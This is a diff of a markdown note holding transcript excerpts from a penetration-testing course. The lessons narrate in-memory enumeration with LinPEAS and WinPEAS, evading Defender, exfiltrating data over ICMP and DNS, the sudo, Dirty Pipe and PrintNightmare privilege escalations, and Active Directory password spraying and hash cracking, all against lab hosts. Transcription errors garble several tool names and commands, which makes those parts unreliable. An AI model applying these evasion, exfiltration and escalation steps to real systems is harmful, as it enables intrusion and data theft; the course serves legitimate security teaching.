@@ -613,12 +604,11 @@ created: 2026-05-02
 
 [↑ Back to Table of Contents](#table-of-contents)
 
-#### Stealthy linux enumeration
-> [LinkedIn Learning](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-linux-enumeration?u=76281980)
+#### [Stealthy linux enumeration](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-linux-enumeration?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-linux-enumeration?u=76281980&t=0)** - LinPEAS is an enumeration script which can be used to search for privilege escalation paths, on a Linux system.
+> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-linux-enumeration?u=76281980&t=0)** - [[LinPEAS]] is an enumeration script which can be used to search for privilege escalation paths, on a [[Linux]] system.
 >
 > **[0:08](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-linux-enumeration?u=76281980&t=8)** It's fairly quiet as it doesn't write anything to disc.
 >
@@ -626,7 +616,7 @@ created: 2026-05-02
 >
 > **[0:19](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-linux-enumeration?u=76281980&t=19)** We'll be stealthy and we'll run this from memory.
 >
-> **[0:22](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-linux-enumeration?u=76281980&t=22)** We can download LinPEAS directly from GitHub.
+> **[0:22](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-linux-enumeration?u=76281980&t=22)** We can download LinPEAS directly from [[GitHub]].
 >
 > **[0:31](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-linux-enumeration?u=76281980&t=31)** Okay.
 >
@@ -666,7 +656,7 @@ created: 2026-05-02
 >
 > **[3:08](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-linux-enumeration?u=76281980&t=188)** A little further down, we see that anacron is running as a root cron job, and this may be a path to escalation, if we can access the scripts.
 >
-> **[3:18](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-linux-enumeration?u=76281980&t=198)** The enumeration is extensive, with additional information regarding Apache and MySQL, as well as a list of open ports.
+> **[3:18](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-linux-enumeration?u=76281980&t=198)** The enumeration is extensive, with additional information regarding Apache and [[MySQL]], as well as a list of open ports.
 >
 > **[3:28](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-linux-enumeration?u=76281980&t=208)** There's much more, but we'll leave it here.
 >
@@ -676,7 +666,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Linux]] (2), [[Search]] (1), [[GitHub]] (1), web (1), next (1)
+> **Frameworks & Libraries:** [[LinPEAS]] (10), [[Linux]] (2), [[GitHub]] (1), [[MySQL]] (1)
 > **CLI Commands:** python3 (1), curl (1), apache (1), mysql (1)
 > **Versions:** 1.249 (2), 1.8.31 (1)
 > **Definitions:** is a  (2), is an  (1)
@@ -685,16 +675,15 @@ created: 2026-05-02
 > **Tools:** github (1)
 > **Prerequisites:** set up (1)
 
-#### Stealthy Windows enumeration
-> [LinkedIn Learning](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-windows-enumeration?u=76281980)
+#### [Stealthy Windows enumeration](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-windows-enumeration?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-windows-enumeration?u=76281980&t=0)** - [Tutor] WinPEAS is the Windows variant of the LinPEAS privileged escalation tool and is available from Carlos Polop site.
+> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-windows-enumeration?u=76281980&t=0)** - [Tutor] [[WinPEAS]] is the [[Windows]] variant of the [[LinPEAS]] privileged escalation tool and is available from Carlos Polop site.
 >
 > **[0:08](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-windows-enumeration?u=76281980&t=8)** There's an obfuscate and obfuscated versions available.
 >
-> **[0:12](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-windows-enumeration?u=76281980&t=12)** I've downloaded the obfuscated executable to Carly already and have a Python web server open.
+> **[0:12](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-windows-enumeration?u=76281980&t=12)** I've downloaded the obfuscated executable to Carly already and have a [[Python (Programming Language)|Python]] web server open.
 >
 > **[0:18](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-windows-enumeration?u=76281980&t=18)** So let's copy it over to our target.
 >
@@ -710,7 +699,7 @@ created: 2026-05-02
 >
 > **[1:02](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-windows-enumeration?u=76281980&t=62)** Unfortunately, this isn't a stealthy approach and we've been detected.
 >
-> **[1:07](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-windows-enumeration?u=76281980&t=67)** Defender does its magic and removes the file.
+> **[1:07](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-windows-enumeration?u=76281980&t=67)** [[Microsoft Defender|Defender]] does its magic and removes the file.
 >
 > **[1:10](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-windows-enumeration?u=76281980&t=70)** There's a version of WinPEAS available as a ps1 module available from the website shown here.
 >
@@ -730,7 +719,7 @@ created: 2026-05-02
 >
 > **[2:03](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-windows-enumeration?u=76281980&t=123)** We currently have 30 modules available and we reload and we now have 31.
 >
-> **[2:10](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-windows-enumeration?u=76281980&t=130)** We're on the target again in PowerShell, so let's connect to PowerHub again and we'll list the hub modules.
+> **[2:10](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-windows-enumeration?u=76281980&t=130)** We're on the target again in [[Powershell]], so let's connect to PowerHub again and we'll list the hub modules.
 >
 > **[2:19](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/stealthy-windows-enumeration?u=76281980&t=139)** (keyboard tapping) And we can see under the PowerSploit recon section, that we have invoke WinPEAS.ps1.
 >
@@ -764,7 +753,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Windows]] (3), [[Microsoft Defender|Defender]] (3), web (2), [[Python (Programming Language)|Python]] (1), [[Powershell]] (1)
+> **Frameworks & Libraries:** [[WinPEAS]] (11), [[Windows]] (3), [[Microsoft Defender|Defender]] (3), [[LinPEAS]] (2), [[Python (Programming Language)|Python]] (1)
 > **CLI Commands:** python (1), ls (1)
 > **Env Vars:** cmd (1)
 > **Versions:** 192.168.1 (1)
@@ -772,12 +761,11 @@ created: 2026-05-02
 > **Prerequisites:** install (1)
 > **Speakers:** - [tutor] (1)
 
-#### Powering up our escalation
-> [LinkedIn Learning](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/powering-up-our-escalation?u=76281980)
+#### [Powering up our escalation](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/powering-up-our-escalation?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/powering-up-our-escalation?u=76281980&t=0)** - We're on our windows 2019 server target.
+> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/powering-up-our-escalation?u=76281980&t=0)** - We're on our [[Windows]] 2019 server target.
 >
 > **[0:04](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/powering-up-our-escalation?u=76281980&t=4)** Let's connect to PowerHub and list the modules.
 >
@@ -817,7 +805,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Windows]] (1), power (1)
+> **Frameworks & Libraries:** [[Windows]] (1)
 > **CLI Commands:** find (1)
 > **Env Vars:** dll (1)
 > **Definitions:** is a  (1)
@@ -830,8 +818,7 @@ created: 2026-05-02
 
 [↑ Back to Table of Contents](#table-of-contents)
 
-#### Setting up and using an SSH tunnel
-> [LinkedIn Learning](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/setting-up-and-using-an-ssh-tunnel?u=76281980)
+#### [Setting up and using an SSH tunnel](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/setting-up-and-using-an-ssh-tunnel?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -867,7 +854,7 @@ created: 2026-05-02
 >
 > **[1:57](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/setting-up-and-using-an-ssh-tunnel?u=76281980&t=117)** - L indicates that this is a local port forwarding request on port 8080 to local host and to go to port 80 on the target.
 >
-> **[2:10](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/setting-up-and-using-an-ssh-tunnel?u=76281980&t=130)** To set this up on the target, we need to log into ubuntu@192.168.1.151, which is our Mutillidae server.
+> **[2:10](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/setting-up-and-using-an-ssh-tunnel?u=76281980&t=130)** To set this up on the target, we need to log into [[Ubuntu]]@192.168.1.151, which is our Mutillidae server.
 >
 > **[2:22](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/setting-up-and-using-an-ssh-tunnel?u=76281980&t=142)** And we now have a tunnel set up.
 >
@@ -891,7 +878,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** traffic (5), [[Ubuntu]] (1), web (1)
+> **Frameworks & Libraries:** [[Ubuntu]] (1)
 > **CLI Commands:** ssh (12), curl (4), grep (1)
 > **Env Vars:** ssh (11), http (1)
 > **Ports:** port 8080 (4), port 80 (3), :8080 (2)
@@ -900,8 +887,7 @@ created: 2026-05-02
 > **UI Navigation:** go to (2)
 > **Definitions:** is a  (2)
 
-#### Exfiltrating data over ICMP
-> [LinkedIn Learning](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exfiltrating-data-over-icmp?u=76281980)
+#### [Exfiltrating data over ICMP](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exfiltrating-data-over-icmp?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -989,7 +975,6 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** data (16)
 > **CLI Commands:** sudo (2), python3 (2), make (1), find (1)
 > **Env Vars:** icmp (6)
 > **File Paths:** server.py (2), client.py (2)
@@ -997,9 +982,9 @@ created: 2026-05-02
 > **Speakers:** - [instructor] (1), - client (1), - server (1)
 > **Tools:** command line (2)
 > **Versions:** 192.168.1 (1)
+> **UI Navigation:** open the (1)
 
-#### Exfiltration via DNS
-> [LinkedIn Learning](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exfiltration-via-dns?u=76281980)
+#### [Exfiltration via DNS](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exfiltration-via-dns?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -1017,7 +1002,7 @@ created: 2026-05-02
 >
 > **[0:26](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exfiltration-via-dns?u=76281980&t=26)** And this will establish the DNS server on our current system which is using IP address 1 9 2 1 6 8 1 2 4 9.
 >
-> **[0:34](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exfiltration-via-dns?u=76281980&t=34)** We'll use Python two for this.
+> **[0:34](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exfiltration-via-dns?u=76281980&t=34)** We'll use [[Python (Programming Language)|Python]] two for this.
 >
 > **[0:37](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exfiltration-via-dns?u=76281980&t=37)** Pseudo Python, 2.7, DN steel.py, and we give it our server address 192.168.1.249.
 >
@@ -1029,7 +1014,7 @@ created: 2026-05-02
 >
 > **[1:06](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exfiltration-via-dns?u=76281980&t=66)** We'll also set verbose mode with minus V to see details of the traffic received.
 >
-> **[1:11](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exfiltration-via-dns?u=76281980&t=71)** Note, the two forms of client command.
+> **[1:11](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exfiltration-via-dns?u=76281980&t=71)** Note, the two [[Forms]] of client command.
 >
 > **[1:13](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exfiltration-via-dns?u=76281980&t=73)** These are both single line command shell scripts.
 >
@@ -1085,7 +1070,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** dns (12), data (4), [[Python (Programming Language)|Python]] (3), traffic (2), [[Forms]] (1)
+> **Frameworks & Libraries:** [[Python (Programming Language)|Python]] (3), [[Forms]] (1)
 > **Env Vars:** dns (12), cns (1)
 > **CLI Commands:** python (3), cat (2), find (1)
 > **File Paths:** sadness.sh (3), steel.py (1)
@@ -1099,12 +1084,11 @@ created: 2026-05-02
 
 [↑ Back to Table of Contents](#table-of-contents)
 
-#### Using Baron Samedit to escalate in Linux
-> [LinkedIn Learning](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-baron-samedit-to-escalate-in-linux?u=76281980)
+#### [Using Baron Samedit to escalate in Linux](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-baron-samedit-to-escalate-in-linux?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-baron-samedit-to-escalate-in-linux?u=76281980&t=0)** - [Instructor] In 2021, a vulnerability was identified in the Linux sudo tool and it enabled and authorized a non-privileged user to gain root privileges as shown in this website.
+> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-baron-samedit-to-escalate-in-linux?u=76281980&t=0)** - [Instructor] In 2021, a vulnerability was identified in the [[Linux]] sudo tool and it enabled and authorized a non-privileged user to gain root privileges as shown in this website.
 >
 > **[0:11](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-baron-samedit-to-escalate-in-linux?u=76281980&t=11)** It affects sudo version 1.8.31.
 >
@@ -1120,7 +1104,7 @@ created: 2026-05-02
 >
 > **[0:45](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-baron-samedit-to-escalate-in-linux?u=76281980&t=45)** Let's download and build the exploit.
 >
-> **[0:47](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-baron-samedit-to-escalate-in-linux?u=76281980&t=47)** So we'll git clone https.
+> **[0:47](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-baron-samedit-to-escalate-in-linux?u=76281980&t=47)** So we'll [[Git]] clone https.
 >
 > **[0:59](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/using-baron-samedit-to-escalate-in-linux?u=76281980&t=59)** And if we go into the folder Sudo-1.8.31-Root-Exploit,
 >
@@ -1140,19 +1124,18 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Linux]] (1), [[Git]] (1), prompt (1)
+> **Frameworks & Libraries:** [[Linux]] (1), [[Git]] (1)
 > **CLI Commands:** sudo (6), git (1), make (1)
 > **Versions:** 1.8.31 (2), version 1 (1), 8.31 (1)
 > **Speakers:** - [instructor] (1)
 
-#### Escalating through a dirty pipe
-> [LinkedIn Learning](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-dirty-pipe?u=76281980)
+#### [Escalating through a dirty pipe](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-dirty-pipe?u=76281980)
 
 > [!transcript]- Transcript
 >
 > **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-dirty-pipe?u=76281980&t=0)** - [Instructor] If the 2021 Baron Samedi escalation has been patched, we might want to try a 2022 privilege escalation.
 >
-> **[0:08](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-dirty-pipe?u=76281980&t=8)** In 2022, a vulnerability was detected in the way in which memory is managed in the Linux kernel.
+> **[0:08](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-dirty-pipe?u=76281980&t=8)** In 2022, a vulnerability was detected in the way in which memory is managed in the [[Linux]] kernel.
 >
 > **[0:15](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-dirty-pipe?u=76281980&t=15)** This enables us to escalate our privileges.
 >
@@ -1160,7 +1143,7 @@ created: 2026-05-02
 >
 > **[0:28](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-dirty-pipe?u=76281980&t=28)** Okay, we're on our target. Let's clone the exploit.
 >
-> **[0:32](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-dirty-pipe?u=76281980&t=32)** Git clone We'll clone that into the dpipe folder.
+> **[0:32](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-dirty-pipe?u=76281980&t=32)** [[Git]] clone We'll clone that into the dpipe folder.
 >
 > **[0:42](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-dirty-pipe?u=76281980&t=42)** Okay, then we can go into dpipe.
 >
@@ -1192,14 +1175,13 @@ created: 2026-05-02
 > **Definitions:** known as (1)
 > **Speakers:** - [instructor] (1)
 
-#### Escalating through a nightmare
-> [LinkedIn Learning](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-nightmare?u=76281980)
+#### [Escalating through a nightmare](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-nightmare?u=76281980)
 
 > [!transcript]- Transcript
 >
 > **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-nightmare?u=76281980&t=0)** - [Instructor] An exploit called PrintNightmare became a critical issue for many IT teams in mid 2021.
 >
-> **[0:07](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-nightmare?u=76281980&t=7)** It affected all Windows systems and enabled the attacker to quickly get root privileges.
+> **[0:07](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-nightmare?u=76281980&t=7)** It affected all [[Windows]] systems and enabled the attacker to quickly get root privileges.
 >
 > **[0:11](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-nightmare?u=76281980&t=11)** It's an exploit which affects the Print Spooler service.
 >
@@ -1213,7 +1195,7 @@ created: 2026-05-02
 >
 > **[0:35](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-nightmare?u=76281980&t=35)** The first thing we need to do is to download the PrintNightmare proof of concept, which we'll rename to just Nightmare.
 >
-> **[0:42](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-nightmare?u=76281980&t=42)** Git clone, and we'll clone that into the Nightmare repository.
+> **[0:42](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-nightmare?u=76281980&t=42)** [[Git]] clone, and we'll clone that into the Nightmare repository.
 >
 > **[0:54](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-nightmare?u=76281980&t=54)** We need to have authenticated user access to run PrintNightmare.
 >
@@ -1241,7 +1223,7 @@ created: 2026-05-02
 >
 > **[2:24](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-nightmare?u=76281980&t=144)** Upload nightmare/CVE-2021-1675.ps1.
 >
-> **[2:42](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-nightmare?u=76281980&t=162)** Okay, that's uploaded, and created a new PowerShell module on the target.
+> **[2:42](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-nightmare?u=76281980&t=162)** Okay, that's uploaded, and created a new [[Powershell]] module on the target.
 >
 > **[2:46](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/escalating-through-a-nightmare?u=76281980&t=166)** Let's import it.
 >
@@ -1273,7 +1255,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Windows]] (3), teams (1), [[Git]] (1), management (1), [[Powershell]] (1)
+> **Frameworks & Libraries:** [[Windows]] (3), [[Git]] (1), [[Powershell]] (1)
 > **CLI Commands:** git (1), ruby (1), sudo (1), cat (1)
 > **Versions:** 10.10.10 (3)
 > **Tools:** command line (1), powershell (1), terminal (1)
@@ -1282,14 +1264,13 @@ created: 2026-05-02
 > **Speakers:** - [instructor] (1), - newpassword (1)
 > **File Paths:** users/administrator/desktop/root.txt (1)
 
-#### Exploiting the Active Domain
-> [LinkedIn Learning](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exploiting-the-active-domain?u=76281980)
+#### [Exploiting the Active Domain](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exploiting-the-active-domain?u=76281980)
 
 > [!transcript]- Transcript
 >
 > **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exploiting-the-active-domain?u=76281980&t=0)** - In a pen test, we may be taking the role of a remote and authenticated user or a malicious employee or contractor that has been given standard user credentials.
 >
-> **[0:10](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exploiting-the-active-domain?u=76281980&t=10)** In either case our target will be to gain the privileges of a domain administrator through exploiting active directory.
+> **[0:10](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exploiting-the-active-domain?u=76281980&t=10)** In either case our target will be to gain the privileges of a domain administrator through exploiting [[Active Directory]].
 >
 > **[0:17](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exploiting-the-active-domain?u=76281980&t=17)** Our first approach will be to try brute force attacks against active directory accounts.
 >
@@ -1303,13 +1284,13 @@ created: 2026-05-02
 >
 > **[1:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exploiting-the-active-domain?u=76281980&t=60)** There's a number of tools we can use to do this.
 >
-> **[1:03](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exploiting-the-active-domain?u=76281980&t=63)** Let's have a look at the DomainPasswordSpray PowerShell script from DAFTHACK.
+> **[1:03](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exploiting-the-active-domain?u=76281980&t=63)** Let's have a look at the DomainPasswordSpray [[Powershell]] script from DAFTHACK.
 >
 > **[1:09](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exploiting-the-active-domain?u=76281980&t=69)** I'm on a domain workstation and logged in as Sam Spade.
 >
 > **[1:12](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exploiting-the-active-domain?u=76281980&t=72)** And I want to see what other user accounts I can obtain.
 >
-> **[1:16](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exploiting-the-active-domain?u=76281980&t=76)** I've downloaded the DomainPasswordSpray script from the GitHub site onto my domain workstation.
+> **[1:16](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exploiting-the-active-domain?u=76281980&t=76)** I've downloaded the DomainPasswordSpray script from the [[GitHub]] site onto my domain workstation.
 >
 > **[1:21](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exploiting-the-active-domain?u=76281980&t=81)** I can now import it and run it in PowerShell.
 >
@@ -1355,13 +1336,13 @@ created: 2026-05-02
 >
 > **[4:07](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exploiting-the-active-domain?u=76281980&t=247)** And I have a list of usernames in the "usersfile" in my home folder.
 >
-> **[4:13](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exploiting-the-active-domain?u=76281980&t=253)** It's called "unames" and we'll specify the format "hashcat".
+> **[4:13](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exploiting-the-active-domain?u=76281980&t=253)** It's called "unames" and we'll specify the format "[[Hashcat]]".
 >
 > **[4:23](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exploiting-the-active-domain?u=76281980&t=263)** And that very quickly checks all the users and we get nstove07's password hash returned.
 >
 > **[4:29](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exploiting-the-active-domain?u=76281980&t=269)** I've extracted that and stored it in a file called "nhash" already.
 >
-> **[4:34](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exploiting-the-active-domain?u=76281980&t=274)** So let's run that through John the Ripper using our standard rockyou dictionary john, ~/nhash, minus, minus, wordlist, equals, slash,
+> **[4:34](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exploiting-the-active-domain?u=76281980&t=274)** So let's run that through [[John the Ripper]] using our standard rockyou dictionary [[John the Ripper|john]], ~/nhash, minus, minus, wordlist, equals, slash,
 >
 > **[4:50](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/exploiting-the-active-domain?u=76281980&t=290)** usr, slash, share, slash, wordlists, slash, rockyou.txt
 >
@@ -1371,7 +1352,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Active Directory]] (11), [[Powershell]] (2), [[GitHub]] (1), cd (1)
+> **Frameworks & Libraries:** [[Active Directory]] (11), [[Powershell]] (2), [[GitHub]] (1), [[Hashcat]] (1), [[John the Ripper]] (1)
 > **File Paths:** adpass.txt (1), getnpusers.py (1), rockyou.txt (1)
 > **CLI Commands:** python3 (2), cd (1)
 > **Tools:** powershell (2), github (1)
@@ -1385,28 +1366,27 @@ created: 2026-05-02
 
 [↑ Back to Table of Contents](#table-of-contents)
 
-#### What's next
-> [LinkedIn Learning](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-s-next?u=76281980)
+#### [What's next](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-s-next?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-s-next?u=76281980&t=0)** - [Malcolm] In this course, you've taken another step in ethical hacking by learning about some advanced techniques for testing.
+> **[0:00](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-s-next?u=76281980&t=0)** - [Malcolm] In this course, you've taken another step in [[Ethical Hacking]] by learning about some advanced techniques for testing.
 >
 > **[0:07](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-s-next?u=76281980&t=7)** However, your learning doesn't stop here.
 >
 > **[0:10](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-s-next?u=76281980&t=10)** There's always new tools and techniques being developed and there are many specialist areas of learning for you to focus on.
 >
-> **[0:18](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-s-next?u=76281980&t=18)** I'd like to invite you to go to my LinkedIn Learning page and check out my other security courses.
+> **[0:18](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-s-next?u=76281980&t=18)** I'd like to invite you to go to my [[LinkedIn]] Learning page and check out my other security courses.
 >
-> **[0:24](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-s-next?u=76281980&t=24)** You'll find a number of security courses on my page, including SQL Injections, Burp Suite, and Active Directory.
+> **[0:24](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-s-next?u=76281980&t=24)** You'll find a number of security courses on my page, including [[SQL]] Injections, [[Burp Suite]], and [[Active Directory]].
 >
-> **[0:32](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-s-next?u=76281980&t=32)** There's always new things to learn in the wider field of information and cybersecurity, so check out the full security segment of the LinkedIn library, where new courses are added regularly.
+> **[0:32](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-s-next?u=76281980&t=32)** There's always new things to learn in the wider field of information and [[Cybersecurity]], so check out the full security segment of the LinkedIn library, where new courses are added regularly.
 >
 > **[0:43](https://www.linkedin.com/learning/stealth-penetration-testing-with-advanced-enumeration/what-s-next?u=76281980&t=43)** You'll find courses on all aspects of security, as well as a full learning path to certified ethical hacker.
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Security]] (4), [[LinkedIn]] (2), [[Ethical Hacking]] (1), [[SQL]] (1), [[Burp Suite]] (1)
+> **Frameworks & Libraries:** [[LinkedIn]] (2), [[Ethical Hacking]] (1), [[SQL]] (1), [[Burp Suite]] (1), [[Active Directory]] (1)
 > **CLI Commands:** find (2)
 > **Env Vars:** sql (1)
 > **UI Navigation:** go to (1)
